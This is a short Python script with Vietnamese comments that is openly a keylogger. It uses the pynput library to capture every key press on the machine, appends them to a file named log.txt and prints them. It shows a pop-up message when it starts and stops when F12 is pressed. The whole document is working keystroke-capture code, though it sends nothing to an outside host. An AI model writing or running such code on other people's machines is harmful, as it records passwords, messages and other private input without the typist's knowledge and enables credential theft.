from pynput.keyboard import Listener
from tkinter import messagebox
# Bắt đầu
messagebox.showinfo(title="Start",
			message="KEY LOGER STOP:D")
# HẦM NGHE 
def anonymous(key):
	key = str(key)
	key = key.replace("'","")
	if key == "Key.f12":
		messagebox.showinfo(title="--",
			message="KEY LOGER STOP")
		raise SystemExit(0)
	if key == "Key.ctrl_l":
		key = "\n"
	if key == "Key.enter":
		key = "\n"
	if key == "Key.alt_l":
		key = "\n"
	if key == "Key.tab":
		key = "\n"

	with open("log.txt", "a") as file:
		file.write(key)
	print(key)	

with Listener(on_press=anonymous)as	listener:
	listener.join()




